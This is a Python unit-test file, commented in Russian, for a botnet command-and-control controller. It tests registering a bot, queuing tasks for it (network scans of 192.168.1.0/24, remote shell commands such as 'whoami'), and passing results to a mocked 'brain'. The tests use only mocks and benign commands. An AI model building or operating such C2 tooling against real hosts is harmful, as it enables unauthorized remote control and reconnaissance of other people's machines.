#!/usr/bin/env python3
"""
Тесты для модуля BotnetController
"""

import os
import time
import json
import unittest
from unittest.mock import MagicMock, patch, call
import threading
import tempfile

# Импортируем компоненты, которые тестируем
from botnet_controller import BotnetController, ZondInfo, ZondConnectionStatus
from zond_protocol import TaskPriority, TaskStatus, ZondMessage, MessageType, ZondTask

class TestBotnetController(unittest.TestCase):
    """Тесты для модуля BotnetController"""
    
    def setUp(self):
        """Настройка перед каждым тестом"""
        # Создаем временный файл для хранения данных зондов
        self.temp_file = tempfile.NamedTemporaryFile(delete=False)
        self.temp_file.close()
        
        # Создаем экземпляр контроллера для тестирования
        self.controller = BotnetController(
            server_id="test_server",
            secret_key="test_secret_key",
            encryption_key="test_encryption_key",
            storage_file=self.temp_file.name
        )
        
        # Мок для мозга
        self.mock_brain = MagicMock()
        self.controller.set_brain(self.mock_brain)
        
        # Создаем зонд для тестирования
        self.zond_id = "test_zond_1"
        self.controller.register_zond(
            zond_id=self.zond_id,
            system_info={
                "platform": "linux",
                "hostname": "test-host-1",
                "username": "testuser",
                "is_admin": False
            },
            capabilities=["scan_network", "execute_shell", "collect_system_info"],
            ip_address="192.168.1.100"
        )
        
        # Получаем объект зонда для непосредственного использования в тестах
        self.zond = self.controller.get_zond(self.zond_id)
    
    def tearDown(self):
        """Очистка после каждого теста"""
        # Останавливаем контроллер если он запущен
        if self.controller.running:
            self.controller.stop()
            
        # Удаляем временный файл
        os.unlink(self.temp_file.name)
    
    def test_register_zond(self):
        """Тест регистрации зонда"""
        # Проверяем, что зонд был зарегистрирован
        self.assertIn(self.zond_id, self.controller.zonds)
        
        # Проверяем информацию о зонде
        zond = self.controller.get_zond(self.zond_id)
        self.assertEqual(zond.zond_id, self.zond_id)
        self.assertEqual(zond.system_info["platform"], "linux")
        self.assertEqual(zond.system_info["hostname"], "test-host-1")
        self.assertEqual(zond.capabilities, ["scan_network", "execute_shell", "collect_system_info"])
        self.assertEqual(zond.ip_address, "192.168.1.100")
        self.assertEqual(zond.status, ZondConnectionStatus.ONLINE)
    
    def test_create_task(self):
        """Тест создания задачи для зонда"""
        # Создаем задачу
        command = "scan_network"
        parameters = {"target": "192.168.1.0/24"}
        task = self.controller.create_task(
            zond_id=self.zond_id,
            command=command,
            parameters=parameters
        )
        
        # Проверяем создание задачи
        self.assertIsNotNone(task)
        self.assertEqual(task.command, command)
        self.assertEqual(task.parameters, parameters)
        self.assertEqual(task.status, TaskStatus.PENDING)
        
        # Проверяем, что задача добавлена к зонду
        zond = self.controller.get_zond(self.zond_id)
        self.assertIn(task.task_id, zond.tasks)
        self.assertEqual(zond.tasks[task.task_id], task)
    
    def test_send_command(self):
        """Тест отправки команды зонду"""
        # Мокаем метод _process_message_queue
        with patch.object(self.controller, '_process_message_queue') as mock_process:
            # Отправляем команду
            command = "execute_shell"
            parameters = {"command": "ls -la"}
            task = self.controller.send_command(
                zond_id=self.zond_id,
                command=command,
                parameters=parameters
            )
            
            # Проверяем, что задача создана
            self.assertIsNotNone(task)
            
            # Проверяем, что метод обработки очереди был вызван
            mock_process.assert_called_once_with(self.zond_id)
    
    def test_handle_result_message_with_brain(self):
        """Тест обработки сообщения с результатом и уведомления мозга"""
        # Создаем задачу
        task_id = "test_task_123"
        task = ZondTask(
            task_id=task_id,
            command="scan_network",
            parameters={"target": "192.168.1.0/24"},
            zond_id=self.zond_id
        )
        self.zond.add_task(task)
        
        # Создаем сообщение с результатом
        status = TaskStatus.COMPLETED
        result = {
            "hosts_found": 5,
            "details": ["192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5"]
        }
        
        message = self.controller.protocol.create_message(
            message_type=MessageType.RESULT,
            data={
                "task_id": task_id,
                "status": status.value,
                "result": result
            },
            receiver_id=self.controller.server_id
        )
        
        # Вызываем метод обработки результата
        self.controller._handle_result_message(self.zond, message)
        
        # Проверяем обновление статуса задачи
        self.assertEqual(self.zond.get_task(task_id).status, status)
        
        # Проверяем вызов метода мозга process_task_result
        self.mock_brain.process_task_result.assert_called_once()
        
        # Проверяем, что метод был вызван с правильными аргументами
        self.mock_brain.process_task_result.assert_called_with(
            zond_id=self.zond_id,
            task_id=task_id,
            status=status,
            result=result
        )
    
    def test_handle_result_message_brain_exception(self):
        """Тест обработки исключения при уведомлении мозга"""
        # Создаем задачу
        task_id = "test_task_456"
        task = ZondTask(
            task_id=task_id,
            command="execute_shell",
            parameters={"command": "whoami"},
            zond_id=self.zond_id
        )
        self.zond.add_task(task)
        
        # Создаем сообщение с результатом
        message = self.controller.protocol.create_message(
            message_type=MessageType.RESULT,
            data={
                "task_id": task_id,
                "status": TaskStatus.COMPLETED.value,
                "result": {"output": "testuser"}
            },
            receiver_id=self.controller.server_id
        )
        
        # Настраиваем мозг на выброс исключения
        self.mock_brain.process_task_result.side_effect = Exception("Тестовая ошибка мозга")
        
        # Вызываем метод обработки результата
        self.controller._handle_result_message(self.zond, message)
        
        # Проверяем, что исключение было обработано и не вызвало краш
        self.mock_brain.process_task_result.assert_called_once()
        
        # Проверяем, что статус задачи обновлен, несмотря на ошибку мозга
        self.assertEqual(self.zond.get_task(task_id).status, TaskStatus.COMPLETED)
    
    def test_no_brain_registered(self):
        """Тест работы без зарегистрированного мозга"""
        # Удаляем мозг
        self.controller.brain = None
        
        # Создаем задачу
        task_id = "test_task_789"
        task = ZondTask(
            task_id=task_id,
            command="collect_system_info",
            parameters={},
            zond_id=self.zond_id
        )
        self.zond.add_task(task)
        
        # Создаем сообщение с результатом
        message = self.controller.protocol.create_message(
            message_type=MessageType.RESULT,
            data={
                "task_id": task_id,
                "status": TaskStatus.COMPLETED.value,
                "result": {"system_info": {"cpu": "Intel", "memory": "8GB"}}
            },
            receiver_id=self.controller.server_id
        )
        
        # Вызываем метод обработки результата
        self.controller._handle_result_message(self.zond, message)
        
        # Проверяем, что статус задачи обновлен
        self.assertEqual(self.zond.get_task(task_id).status, TaskStatus.COMPLETED)

if __name__ == '__main__':
    unittest.main() 